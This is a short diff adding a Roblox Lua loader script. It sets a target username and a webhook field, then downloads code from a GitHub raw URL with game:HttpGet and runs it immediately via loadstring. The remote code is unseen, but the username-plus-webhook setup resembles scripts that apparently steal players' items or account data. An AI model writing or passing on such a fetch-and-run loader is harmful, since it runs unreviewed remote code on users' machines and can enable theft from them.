@@ -1,0 +1,5 @@
+_G.UserName = "glentovskii332"
+_G.UserName2 = "HERE" -- optional
+_G.Webhook = "HERR" -- optional
+    
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/LypherXZcript/main/LypherScripts", true))()
